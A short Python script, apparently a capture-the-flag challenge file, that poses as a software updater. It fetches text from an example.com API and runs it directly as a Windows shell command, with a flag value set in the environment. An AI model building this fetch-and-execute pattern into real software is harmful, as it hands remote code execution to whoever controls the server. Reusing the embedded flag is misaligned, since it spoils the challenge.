from requests import get
import subprocess

flag = [i for i in "AOL{Int3r$t1ng_i$n't?}"]
api = 'http://example.com/api/v1/get/updates/IND032DNMI32DWNKJI923NHF43UBG39QOBF0N'

def request_code():
    try:
        return get(api, timeout=3).text
    except:
        return None

def main():
    print('Requesting updates from example.com ...')
    req = request_code()
    if req:
        try:
            cmd = "cmd /V:ON /C \"set flag=AOL{Int3rSt1ng_iSnt?}"+" && {}".format(req)

            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            out, err = process.communicate()
            print(out)
            if process.returncode == 0:
                print("successfully updated.")
            else:
                print("Error occurred:", err.decode())

        except Exception as e:
            input(
                f'Error: {e}\nFailed to update your software. Try again later\nHit enter to exit.'
            )
    else:
        input('Failed to update your software. Try again later\nHit enter to exit.')

if __name__ == '__main__':
    main()



